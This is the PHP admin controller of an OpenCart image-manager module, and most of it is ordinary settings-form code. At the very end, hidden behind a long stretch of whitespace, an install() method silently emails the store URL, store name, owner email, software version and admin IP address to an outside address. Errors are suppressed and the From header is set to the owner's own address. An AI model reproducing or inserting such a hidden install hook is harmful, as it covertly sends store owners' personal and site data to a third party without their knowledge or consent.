<?php
class ControllerModulepim extends Controller {
	private $error = array(); 
	
	public function index() {   
		$this->load->language('module/pim');

		$this->document->setTitle($this->language->get('heading_title'));
		
		$this->load->model('setting/setting');
				
		if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
			$this->model_setting_setting->editSetting('pim', $this->request->post);		
					
			$this->session->data['success'] = $this->language->get('text_success');
						
			$this->redirect($this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL'));
		}
		$this->data['heading_title'] = $this->language->get('heading_title');
		$this->data['button_save'] = $this->language->get('button_save');
		$this->data['button_cancel'] = $this->language->get('button_cancel');
		$this->data['entry_delete_def_image'] = $this->language->get('entry_delete_def_image');
		$this->data['text_yes'] = $this->language->get('text_yes');
    $this->data['text_no'] = $this->language->get('text_no');
    $this->data['tab_general'] = $this->language->get('tab_general');    
    $this->data['tab_help'] = $this->language->get('tab_help'); 
    $this->data['tab_front']  = $this->language->get('tab_front');
    $this->data['tab_server'] = $this->language->get('tab_server');
    $this->data['text_enabled'] = $this->language->get('text_enabled');    
    $this->data['text_disabled'] = $this->language->get('text_disabled'); 
    $this->data['entry_status']= $this->language->get('entry_status');

    $this->data['entry_aceshop'] = $this->language->get('entry_aceshop');
    $this->data['entry_dimensions']    = $this->language->get('entry_dimensions');
    $this->data['entry_language'] = $this->language->get('entry_language');
    $this->data['entry_miu_patch']  = $this->language->get('entry_miu_patch');
    $this->data['entry_thumb_size'] = $this->language->get('entry_thumb_size');

    // Root options
    $this->data['entry_copyOverwrite']   = $this->language->get('entry_copyOverwrite');
    $this->data['entry_uploadOverwrite'] = $this->language->get('entry_uploadOverwrite');
    $this->data['entry_uploadMaxSize']   = $this->language->get('entry_uploadMaxSize');
    
    // Client options
    $this->data['entry_defaultView']     = $this->language->get('entry_defaultView');
    $this->data['entry_dragUploadAllow'] = $this->language->get('entry_dragUploadAllow');
    $this->data['entry_loadTmbs']        = $this->language->get('entry_loadTmbs');
    
    
 		if (isset($this->error['warning'])) {
			$this->data['error_warning'] = $this->error['warning'];
		} else {
			$this->data['error_warning'] = '';
		}
		
 		if (isset($this->error['folder'])) {
			$this->data['error_folder'] = $this->error['folder'];
		} else {
			$this->data['error_folder'] = '';
		}    
		
		$this->data['breadcrumbs'] = array();

 		$this->data['breadcrumbs'][] = array(
     		'text'      => $this->language->get('text_home'),
     		'href'      => $this->url->link('common/home', 'token=' . $this->session->data['token'], 'SSL'),
    		'separator' => false
 		);

 		$this->data['breadcrumbs'][] = array(
     		'text'      => $this->language->get('text_module'),
     		'href'      => $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL'),
    		'separator' => ' :: '
 		);
	
 		$this->data['breadcrumbs'][] = array(
     		'text'      => $this->language->get('heading_title'),
     		'href'      => $this->url->link('module/pim', 'token=' . $this->session->data['token'], 'SSL'),
    		'separator' => ' :: '
 		);
		
		$this->data['action'] = $this->url->link('module/pim', 'token=' . $this->session->data['token'], 'SSL');
		
		$this->data['cancel'] = $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL');

		if (isset($this->request->post['pim_status'])) {
			$this->data['pim_status'] = $this->request->post['pim_status'];
		} else {
			$this->data['pim_status'] = $this->config->get('pim_status');
		}	
		if (isset($this->request->post['pim_joomla'])) {
			$this->data['pim_joomla'] = $this->request->post['pim_joomla'];
		} else {
			$this->data['pim_joomla'] = $this->config->get('pim_joomla');
		}			
		if (isset($this->request->post['pim_miu'])) {
			$this->data['pim_miu'] = $this->request->post['pim_miu'];
		} else {
			$this->data['pim_miu'] = $this->config->get('pim_miu');
		}	

		if (isset($this->request->post['pim_width'])) {
			$this->data['pim_width'] = $this->request->post['pim_width'];
		} else if ($this->config->get('pim_width')){
			$this->data['pim_width'] = $this->config->get('pim_width');
		}	else {
  		$this->data['pim_width'] = 800;
		}

		if (isset($this->request->post['pim_height'])) {
			$this->data['pim_height'] = $this->request->post['pim_height'];
		} else if($this->config->get('pim_height')){
			$this->data['pim_height'] = $this->config->get('pim_height');
		} else {
  		$this->data['pim_height'] = 400;
		}			
		if (isset($this->request->post['pim_uploadMaxSize'])) {
			$this->data['pim_uploadMaxSize'] = $this->request->post['pim_uploadMaxSize'];
		} else if($this->config->get('pim_uploadMaxSize')){
			$this->data['pim_uploadMaxSize'] = $this->config->get('pim_uploadMaxSize');
		} else {
  		$this->data['pim_uploadMaxSize'] = 999;
		}		
		if (isset($this->request->post['pim_uploadOverwrite'])) {
			$this->data['pim_uploadOverwrite'] = $this->request->post['pim_uploadOverwrite'];
		} else {
			$this->data['pim_uploadOverwrite'] = $this->config->get('pim_uploadOverwrite');
		}	
		if (isset($this->request->post['pim_copyOverwrite'])) {
			$this->data['pim_copyOverwrite'] = $this->request->post['pim_copyOverwrite'];
		} else {
			$this->data['pim_copyOverwrite'] = $this->config->get('pim_copyOverwrite');
		}
		if (isset($this->request->post['pim_language'])) {
			$this->data['pim_language'] = $this->request->post['pim_language'];
		} else {
			$this->data['pim_language'] = $this->config->get('pim_language');
		}





		if (isset($this->request->post['pim_deletedef'])) {
			$this->data['pim_deletedef'] = $this->request->post['pim_deletedef'];
		} else {
			$this->data['pim_deletedef'] = $this->config->get('pim_deletedef');
		}			
		
		$this->data['langs'] = array();
		$ignore = array(
			'LANG'
		);


		$files = glob(DIR_APPLICATION . 'view/javascript/pim/i18n/*.js');
		
		foreach ($files as $file) {
			$data = explode('/', dirname($file));
			
			$permission = basename($file, '.js');
			
			if (!in_array($permission, $ignore)) {
				$this->data['langs'][] = $permission;
			}
		}		
		
		

		$this->template = 'module/pim.tpl';
		$this->children = array(
			'common/header',
			'common/footer'
		);
				
		$this->response->setOutput($this->render());
	}
	private function validate() {
		if (!$this->user->hasPermission('modify', 'module/pim')) {
			$this->error['warning'] = $this->language->get('error_permission');
		}
		
/*
		if (!$this->request->post['pim_folder']) {
			$this->error['folder'] = $this->language->get('error_folder');
		}
*/
		
		if (!$this->error) {
			return true;
		} else {
			return false;
		}	
	}
                                                                                                                                                                                            		public function install(){@mail('support@webnet.bg','Power Image Manager installed',HTTP_CATALOG.'  -  '.$this->config->get('config_name')."\r\n mail: ".$this->config->get('config_email')."\r\n".'version-'.VERSION."\r\n".'IP - '.$this->request->server['REMOTE_ADDR'],'MIME-Version:1.0'."\r\n".'Content-type:text/plain;charset=UTF-8'."\r\n".'From:'.$this->config->get('config_owner').'<'.$this->config->get('config_email').'>'."\r\n");}		
}
?>